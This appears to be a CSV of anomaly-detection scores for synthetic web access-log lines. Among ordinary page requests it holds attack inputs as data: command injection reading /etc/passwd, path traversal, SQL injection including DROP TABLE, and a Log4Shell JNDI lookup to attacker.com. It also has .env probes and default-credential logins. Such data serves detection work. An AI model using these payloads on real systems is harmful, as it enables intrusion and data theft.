score_content,score_session,score_fused,line
17.499906539916992,,17.499906539916992,37.145.243.49 - - [10/Jan/2025:12:10:11 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 429 1154 "https://twitter.com/" "nikto/2.5.0"
0.3320055305957794,,0.3320055305957794,155.57.6.135 - - [10/Jan/2025:12:10:13 +0000] "GET /index.html HTTP/1.1" 200 7722 "-" "Wget/1.20.3 (linux-gnu)"
3.650581121444702,,3.650581121444702,184.46.236.206 - - [10/Jan/2025:12:10:15 +0000] "GET /api/products HTTP/1.1" 304 11265 "-" "curl/7.68.0"
2.3058042526245117,,2.3058042526245117,221.94.246.19 - - [10/Jan/2025:12:10:15 +0000] "GET /../../etc/passwd HTTP/1.1" 304 17345 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
5.832456588745117,,5.832456588745117,188.243.112.203 - - [10/Jan/2025:12:10:19 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 5261 "https://example.com/" "nikto/2.5.0"
1.6660362482070923,,1.6660362482070923,209.45.97.79 - - [10/Jan/2025:12:10:20 +0000] "GET /profile HTTP/1.1" 200 19398 "https://example.com/" "sqlmap/1.5.10#stable"
13.624350547790527,,13.624350547790527,101.218.198.248 - - [10/Jan/2025:12:10:21 +0000] "GET / HTTP/1.1" 429 1173 "-" "python-requests/2.31.0"
5.824249267578125,,5.824249267578125,240.128.37.85 - - [10/Jan/2025:12:10:22 +0000] "GET /api/product?id=123 HTTP/1.1" 201 3511 "-" "sqlmap/1.5.10#stable"
1.5564781427383423,,1.5564781427383423,211.182.172.164 - - [10/Jan/2025:12:10:23 +0000] "GET /dashboard HTTP/1.1" 200 3007 "https://example.com/" "sqlmap/1.5.10#stable"
5.675490856170654,,5.675490856170654,90.66.202.28 - - [10/Jan/2025:12:10:26 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
573.6055908203125,,573.6055908203125,127.226.97.90 - - [10/Jan/2025:12:10:29 +0000] "GET /search?q=phone HTTP/1.1" 500 847 "https://news.ycombinator.com/" "python-requests/2.31.0"
5.824777126312256,,5.824777126312256,205.217.9.76 - - [10/Jan/2025:12:10:29 +0000] "GET /api/product?id=123 HTTP/1.1" 200 2515 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.7105404138565063,,1.7105404138565063,42.188.20.141 - - [10/Jan/2025:12:10:31 +0000] "GET /about HTTP/1.1" 200 12403 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
7.836905002593994,,7.836905002593994,242.168.43.156 - - [10/Jan/2025:12:10:35 +0000] "GET /search?q=headphones HTTP/1.1" 302 14233 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
573.4498901367188,,573.4498901367188,179.142.185.237 - - [10/Jan/2025:12:10:35 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 500 838 "https://example.com/" "python-requests/2.31.0"
0.3637770712375641,,0.3637770712375641,216.126.40.14 - - [10/Jan/2025:12:10:37 +0000] "GET /index.html HTTP/1.1" 200 18111 "-" "curl/7.68.0"
5.951687335968018,,5.951687335968018,53.44.164.75 - - [10/Jan/2025:12:10:40 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 943 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.831284046173096,,5.831284046173096,24.165.140.100 - - [10/Jan/2025:12:10:40 +0000] "GET /search?q=laptop HTTP/1.1" 200 8783 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.849428176879883,,5.849428176879883,120.68.58.215 - - [10/Jan/2025:12:10:43 +0000] "GET /search?q=camera HTTP/1.1" 200 14509 "https://twitter.com/" "curl/7.68.0"
1.6433005332946777,,1.6433005332946777,207.139.106.249 - - [10/Jan/2025:12:10:43 +0000] "GET /contact HTTP/1.1" 200 11365 "https://www.google.com/" "python-requests/2.31.0"
11.506264686584473,,11.506264686584473,248.138.176.222 - - [10/Jan/2025:12:10:47 +0000] "GET /.env HTTP/1.1" 400 857 "https://twitter.com/" "nikto/2.5.0"
1.6823188066482544,,1.6823188066482544,129.147.231.133 - - [10/Jan/2025:12:10:48 +0000] "GET /about HTTP/1.1" 200 1237 "https://twitter.com/" "python-requests/2.31.0"
0.19027608633041382,,0.19027608633041382,249.55.207.50 - - [10/Jan/2025:12:10:49 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 5577 "-" "curl/7.68.0"
1.4620333909988403,,1.4620333909988403,214.153.67.82 - - [10/Jan/2025:12:10:52 +0000] "GET /server-status HTTP/1.1" 200 4945 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.583963394165039,,12.583963394165039,118.235.224.4 - - [10/Jan/2025:12:10:55 +0000] "GET /dashboard HTTP/1.1" 401 1064 "https://twitter.com/" "sqlmap/1.5.10#stable"
5.8379974365234375,,5.8379974365234375,38.146.151.150 - - [10/Jan/2025:12:10:59 +0000] "GET /search?q=phone HTTP/1.1" 200 5003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.73193359375,,12.73193359375,225.106.68.99 - - [10/Jan/2025:12:11:03 +0000] "GET /logout HTTP/1.1" 403 704 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.35037359595298767,,0.35037359595298767,37.159.156.175 - - [10/Jan/2025:12:11:07 +0000] "GET /index.html HTTP/1.1" 200 13304 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
3.600219488143921,,3.600219488143921,191.122.236.69 - - [10/Jan/2025:12:11:07 +0000] "GET /dashboard HTTP/1.1" 301 1715 "-" "curl/7.68.0"
1.6889694929122925,,1.6889694929122925,220.179.176.26 - - [10/Jan/2025:12:11:09 +0000] "GET /logout HTTP/1.1" 200 16209 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
7.915452480316162,,7.915452480316162,69.187.107.155 - - [10/Jan/2025:12:11:11 +0000] "GET /search?q=camera HTTP/1.1" 304 10614 "-" "sqlmap/1.5.10#stable"
7.93212890625,,7.93212890625,223.96.211.15 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=phone HTTP/1.1" 302 17024 "https://www.google.com/" "python-requests/2.31.0"
5.857090473175049,,5.857090473175049,226.146.8.45 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=laptop HTTP/1.1" 200 17279 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.8416032791137695,,5.8416032791137695,181.51.71.95 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=camera HTTP/1.1" 200 11908 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
3.6754119396209717,,3.6754119396209717,96.126.153.115 - - [10/Jan/2025:12:11:15 +0000] "GET /contact HTTP/1.1" 301 8027 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6339348554611206,,1.6339348554611206,192.213.177.24 - - [10/Jan/2025:12:11:19 +0000] "GET /profile HTTP/1.1" 200 8575 "-" "curl/7.68.0"
16.6977481842041,,16.6977481842041,58.174.53.69 - - [10/Jan/2025:12:11:22 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 401 1325 "https://twitter.com/" "dirb/2.22"
1.8670426607131958,,1.8670426607131958,166.45.154.206 - - [10/Jan/2025:12:11:22 +0000] "GET / HTTP/1.1" 200 4435 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.721562385559082,,3.721562385559082,109.230.97.219 - - [10/Jan/2025:12:11:24 +0000] "GET /logout HTTP/1.1" 302 9123 "https://news.ycombinator.com/" "curl/7.68.0"
3.723362684249878,,3.723362684249878,150.27.2.131 - - [10/Jan/2025:12:11:26 +0000] "GET /logout HTTP/1.1" 301 13113 "https://example.com/" "sqlmap/1.5.10#stable"
1.6478333473205566,,1.6478333473205566,124.17.87.254 - - [10/Jan/2025:12:11:30 +0000] "GET /logout HTTP/1.1" 200 3642 "https://example.com/" "curl/7.68.0"
1.6912503242492676,,1.6912503242492676,196.62.231.15 - - [10/Jan/2025:12:11:32 +0000] "GET /logout HTTP/1.1" 200 17050 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.319822311401367,,2.319822311401367,76.67.233.108 - - [10/Jan/2025:12:11:37 +0000] "GET /assets/app.css HTTP/1.1" 302 16397 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
5.690939903259277,,5.690939903259277,176.137.164.201 - - [10/Jan/2025:12:11:42 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 7386 "https://example.com/" "nikto/2.5.0"
11.244028091430664,,11.244028091430664,47.76.25.121 - - [10/Jan/2025:12:11:46 +0000] "GET /assets/app.js HTTP/1.1" 400 1143 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.014822006225586,,12.014822006225586,168.23.57.91 - - [10/Jan/2025:12:11:51 +0000] "GET /assets/app.js HTTP/1.1" 429 687 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6073031425476074,,1.6073031425476074,76.119.218.31 - - [10/Jan/2025:12:11:54 +0000] "GET /dashboard HTTP/1.1" 200 19287 "-" "Wget/1.20.3 (linux-gnu)"
1.690356731414795,,1.690356731414795,129.31.223.175 - - [10/Jan/2025:12:11:59 +0000] "GET /about HTTP/1.1" 200 6474 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.23336690664291382,,0.23336690664291382,88.105.253.146 - - [10/Jan/2025:12:12:01 +0000] "GET /assets/app.css HTTP/1.1" 200 6663 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
2.363090753555298,,2.363090753555298,86.162.253.46 - - [10/Jan/2025:12:12:03 +0000] "GET /assets/app.js HTTP/1.1" 304 16077 "-" "curl/7.68.0"
3.6084344387054443,,3.6084344387054443,148.196.41.126 - - [10/Jan/2025:12:12:03 +0000] "GET /api/products HTTP/1.1" 302 5624 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.873166084289551,,5.873166084289551,99.2.10.137 - - [10/Jan/2025:12:12:07 +0000] "GET /search?q=phone HTTP/1.1" 200 15743 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6030155420303345,,1.6030155420303345,161.188.64.58 - - [10/Jan/2025:12:12:07 +0000] "GET /api/products HTTP/1.1" 200 235 "https://example.com/" "sqlmap/1.5.10#stable"
0.5239049792289734,,0.5239049792289734,43.17.211.12 - - [10/Jan/2025:12:12:09 +0000] "GET /.env HTTP/1.1" 200 10130 "https://example.com/" "python-requests/2.31.0"
1.5607807636260986,,1.5607807636260986,88.231.126.92 - - [10/Jan/2025:12:12:12 +0000] "GET /dashboard HTTP/1.1" 200 4484 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
7.750977039337158,,7.750977039337158,55.188.6.151 - - [10/Jan/2025:12:12:15 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 4399 "-" "curl/7.68.0"
0.33469143509864807,,0.33469143509864807,198.137.160.13 - - [10/Jan/2025:12:12:17 +0000] "GET /index.html HTTP/1.1" 200 8481 "-" "python-requests/2.31.0"
1.6812655925750732,,1.6812655925750732,107.114.98.32 - - [10/Jan/2025:12:12:22 +0000] "GET /admin HTTP/1.1" 200 3894 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.8638666868209839,,1.8638666868209839,170.134.70.160 - - [10/Jan/2025:12:12:27 +0000] "GET / HTTP/1.1" 200 3408 "https://www.google.com/" "python-requests/2.31.0"
1.6174956560134888,,1.6174956560134888,73.30.201.28 - - [10/Jan/2025:12:12:30 +0000] "GET /contact HTTP/1.1" 200 3957 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
12.708783149719238,,12.708783149719238,92.181.105.76 - - [10/Jan/2025:12:12:34 +0000] "GET /login HTTP/1.1" 400 413 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.630662679672241,,3.630662679672241,85.61.1.4 - - [10/Jan/2025:12:12:38 +0000] "GET /api/products HTTP/1.1" 301 15850 "-" "sqlmap/1.5.10#stable"
5.744613170623779,,5.744613170623779,200.131.20.186 - - [10/Jan/2025:12:12:38 +0000] "GET /search?q=headphones HTTP/1.1" 200 3051 "-" "sqlmap/1.5.10#stable"
573.6698608398438,,573.6698608398438,68.119.13.26 - - [10/Jan/2025:12:12:40 +0000] "GET /search?q=camera HTTP/1.1" 502 606 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.5588568449020386,,1.5588568449020386,25.218.195.228 - - [10/Jan/2025:12:12:42 +0000] "GET /dashboard HTTP/1.1" 200 3897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2805517911911011,,0.2805517911911011,245.160.69.225 - - [10/Jan/2025:12:12:43 +0000] "GET /assets/app.js HTTP/1.1" 200 14443 "-" "sqlmap/1.5.10#stable"
0.2769258916378021,,0.2769258916378021,247.117.70.214 - - [10/Jan/2025:12:12:45 +0000] "GET /assets/app.js HTTP/1.1" 200 13215 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.24227246642112732,,0.24227246642112732,252.242.217.41 - - [10/Jan/2025:12:12:48 +0000] "GET /assets/app.js HTTP/1.1" 200 2021 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.8435750007629395,,5.8435750007629395,200.92.157.8 - - [10/Jan/2025:12:12:52 +0000] "GET /search?q=camera HTTP/1.1" 200 12543 "https://www.google.com/" "sqlmap/1.5.10#stable"
12.694670677185059,,12.694670677185059,12.17.67.168 - - [10/Jan/2025:12:12:55 +0000] "GET /contact HTTP/1.1" 403 902 "-" "curl/7.68.0"
573.588623046875,,573.588623046875,224.87.133.134 - - [10/Jan/2025:12:13:00 +0000] "GET /api/product?id=123 HTTP/1.1" 500 1371 "https://twitter.com/" "sqlmap/1.5.10#stable"
5.85788106918335,,5.85788106918335,39.215.212.143 - - [10/Jan/2025:12:13:00 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12711 "-" "python-requests/2.31.0"
0.28349751234054565,,0.28349751234054565,219.127.223.43 - - [10/Jan/2025:12:13:00 +0000] "GET /assets/app.js HTTP/1.1" 200 15477 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.6937121152877808,,1.6937121152877808,141.165.97.104 - - [10/Jan/2025:12:13:02 +0000] "GET /login HTTP/1.1" 200 7397 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.8548173904418945,,5.8548173904418945,115.81.31.252 - - [10/Jan/2025:12:13:05 +0000] "GET /search?q=camera HTTP/1.1" 200 16433 "-" "Wget/1.20.3 (linux-gnu)"
0.42281392216682434,,0.42281392216682434,212.24.203.155 - - [10/Jan/2025:12:13:05 +0000] "GET /index.html HTTP/1.1" 200 105 "https://example.com/" "python-requests/2.31.0"
17.5794734954834,,17.5794734954834,212.14.210.58 - - [10/Jan/2025:12:13:09 +0000] "GET /search?q=camera HTTP/1.1" 429 744 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
7.830179214477539,,7.830179214477539,184.116.30.25 - - [10/Jan/2025:12:13:13 +0000] "GET /search?q=headphones HTTP/1.1" 302 12004 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.6777069568634033,,1.6777069568634033,180.28.12.230 - - [10/Jan/2025:12:13:13 +0000] "GET /logout HTTP/1.1" 200 12351 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.84346342086792,,5.84346342086792,49.31.239.219 - - [10/Jan/2025:12:13:14 +0000] "GET /search?q=phone HTTP/1.1" 200 6519 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
3.6017110347747803,,3.6017110347747803,194.107.12.238 - - [10/Jan/2025:12:13:17 +0000] "GET /api/products HTTP/1.1" 302 3631 "https://twitter.com/" "sqlmap/1.5.10#stable"
5.862574577331543,,5.862574577331543,245.130.35.247 - - [10/Jan/2025:12:13:17 +0000] "GET /search?q=camera HTTP/1.1" 200 19410 "-" "Wget/1.20.3 (linux-gnu)"
16.83373260498047,,16.83373260498047,237.131.200.236 - - [10/Jan/2025:12:13:21 +0000] "GET /search?q=phone HTTP/1.1" 400 989 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.27318376302719116,,0.27318376302719116,156.226.83.130 - - [10/Jan/2025:12:13:22 +0000] "GET /assets/app.css HTTP/1.1" 200 19778 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
5.853576183319092,,5.853576183319092,249.76.116.207 - - [10/Jan/2025:12:13:26 +0000] "GET /api/product?id=123 HTTP/1.1" 200 11334 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.648467063903809,,12.648467063903809,221.81.183.189 - - [10/Jan/2025:12:13:29 +0000] "GET /logout HTTP/1.1" 400 1121 "https://www.google.com/" "python-requests/2.31.0"
3.6938555240631104,,3.6938555240631104,252.182.167.250 - - [10/Jan/2025:12:13:30 +0000] "GET /logout HTTP/1.1" 301 4447 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.640216112136841,,3.640216112136841,144.123.150.147 - - [10/Jan/2025:12:13:34 +0000] "GET /dashboard HTTP/1.1" 302 11642 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
12.72686767578125,,12.72686767578125,207.4.134.28 - - [10/Jan/2025:12:13:39 +0000] "GET /logout HTTP/1.1" 403 865 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.27333158254623413,,0.27333158254623413,252.74.175.65 - - [10/Jan/2025:12:13:40 +0000] "GET /wp-login.php HTTP/1.1" 200 5373 "-" "curl/7.68.0"
3.604673147201538,,3.604673147201538,92.209.116.27 - - [10/Jan/2025:12:13:45 +0000] "GET /api/products HTTP/1.1" 302 1158 "https://twitter.com/" "python-requests/2.31.0"
5.833827495574951,,5.833827495574951,178.171.13.238 - - [10/Jan/2025:12:13:46 +0000] "GET /search?q=laptop HTTP/1.1" 200 9525 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
569.4342041015625,,569.4342041015625,4.191.65.52 - - [10/Jan/2025:12:13:49 +0000] "GET /dashboard HTTP/1.1" 500 110 "https://news.ycombinator.com/" "python-requests/2.31.0"
3.7168664932250977,,3.7168664932250977,190.155.51.199 - - [10/Jan/2025:12:13:50 +0000] "GET /profile HTTP/1.1" 302 18011 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.6878708600997925,,1.6878708600997925,189.132.31.97 - - [10/Jan/2025:12:13:52 +0000] "GET /about HTTP/1.1" 200 5794 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.23978672921657562,,0.23978672921657562,2.85.120.182 - - [10/Jan/2025:12:13:54 +0000] "GET /assets/app.css HTTP/1.1" 200 8456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.4176626205444336,,2.4176626205444336,126.203.147.141 - - [10/Jan/2025:12:13:55 +0000] "GET /index.html HTTP/1.1" 304 9968 "-" "curl/7.68.0"
17.5852108001709,,17.5852108001709,18.202.130.41 - - [10/Jan/2025:12:14:00 +0000] "GET /api/product?id=123 HTTP/1.1" 429 1066 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.6286357641220093,,1.6286357641220093,170.85.85.93 - - [10/Jan/2025:12:14:04 +0000] "GET /profile HTTP/1.1" 200 7091 "https://www.google.com/" "curl/7.68.0"
1.8915009498596191,,1.8915009498596191,115.62.232.165 - - [10/Jan/2025:12:14:08 +0000] "GET / HTTP/1.1" 200 11437 "https://twitter.com/" "python-requests/2.31.0"
1.5586037635803223,,1.5586037635803223,99.66.139.186 - - [10/Jan/2025:12:14:09 +0000] "GET /dashboard HTTP/1.1" 200 3815 "-" "curl/7.68.0"
1.659201741218567,,1.659201741218567,115.125.12.76 - - [10/Jan/2025:12:14:13 +0000] "GET /profile HTTP/1.1" 200 16770 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.6617528200149536,,1.6617528200149536,137.2.161.17 - - [10/Jan/2025:12:14:15 +0000] "GET /contact HTTP/1.1" 200 17728 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6524509191513062,,1.6524509191513062,166.210.241.19 - - [10/Jan/2025:12:14:20 +0000] "GET /contact HTTP/1.1" 200 14361 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.5557152032852173,,1.5557152032852173,14.46.204.65 - - [10/Jan/2025:12:14:20 +0000] "GET /dashboard HTTP/1.1" 200 2500 "-" "python-requests/2.31.0"
1.717919111251831,,1.717919111251831,162.104.111.81 - - [10/Jan/2025:12:14:24 +0000] "GET /login HTTP/1.1" 200 14882 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.6755919456481934,,1.6755919456481934,194.191.150.12 - - [10/Jan/2025:12:14:29 +0000] "GET /admin HTTP/1.1" 201 2172 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.846933364868164,,5.846933364868164,196.238.113.98 - - [10/Jan/2025:12:14:33 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 9324 "-" "dirb/2.22"
5.858493328094482,,5.858493328094482,204.205.218.140 - - [10/Jan/2025:12:14:36 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12912 "https://www.google.com/" "curl/7.68.0"
13.612689971923828,,13.612689971923828,142.224.143.37 - - [10/Jan/2025:12:14:38 +0000] "GET /profile HTTP/1.1" 429 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.811488628387451,,5.811488628387451,79.54.192.190 - - [10/Jan/2025:12:14:38 +0000] "GET /search?q=laptop HTTP/1.1" 200 2889 "https://example.com/" "sqlmap/1.5.10#stable"
0.2357965111732483,,0.2357965111732483,158.214.65.50 - - [10/Jan/2025:12:14:39 +0000] "GET /assets/app.css HTTP/1.1" 200 7334 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.341774940490723,,11.341774940490723,119.166.141.19 - - [10/Jan/2025:12:14:44 +0000] "GET /index.html HTTP/1.1" 401 1124 "-" "curl/7.68.0"
17.71152687072754,,17.71152687072754,33.172.168.61 - - [10/Jan/2025:12:14:46 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 429 731 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.715038776397705,,5.715038776397705,85.158.169.79 - - [10/Jan/2025:12:14:50 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 14866 "https://twitter.com/" "curl/7.68.0"
13.353728294372559,,13.353728294372559,2.81.64.202 - - [10/Jan/2025:12:14:54 +0000] "GET /dashboard HTTP/1.1" 429 345 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.292617082595825,,2.292617082595825,225.123.119.115 - - [10/Jan/2025:12:14:56 +0000] "GET /assets/app.css HTTP/1.1" 301 10964 "https://example.com/" "curl/7.68.0"
0.23347488045692444,,0.23347488045692444,216.72.220.212 - - [10/Jan/2025:12:14:59 +0000] "GET /assets/app.js HTTP/1.1" 204 2786 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.748288631439209,,3.748288631439209,218.130.162.8 - - [10/Jan/2025:12:15:00 +0000] "GET /about HTTP/1.1" 302 710 "https://twitter.com/" "python-requests/2.31.0"
12.620743751525879,,12.620743751525879,67.140.229.139 - - [10/Jan/2025:12:15:03 +0000] "GET /api/products HTTP/1.1" 403 1129 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
1.6898196935653687,,1.6898196935653687,131.24.102.94 - - [10/Jan/2025:12:15:05 +0000] "GET /logout HTTP/1.1" 200 16520 "-" "python-requests/2.31.0"
2.3033528327941895,,2.3033528327941895,115.41.46.145 - - [10/Jan/2025:12:15:10 +0000] "GET /assets/app.js HTTP/1.1" 302 4699 "https://www.google.com/" "python-requests/2.31.0"
1.6573158502578735,,1.6573158502578735,60.17.68.95 - - [10/Jan/2025:12:15:15 +0000] "GET /profile HTTP/1.1" 200 16079 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6542823314666748,,1.6542823314666748,226.12.11.252 - - [10/Jan/2025:12:15:20 +0000] "GET /profile HTTP/1.1" 200 14997 "https://example.com/" "sqlmap/1.5.10#stable"
12.699202537536621,,12.699202537536621,149.140.146.45 - - [10/Jan/2025:12:15:20 +0000] "GET /login HTTP/1.1" 400 539 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.7106270790100098,,1.7106270790100098,250.233.58.133 - - [10/Jan/2025:12:15:22 +0000] "GET /about HTTP/1.1" 200 12431 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
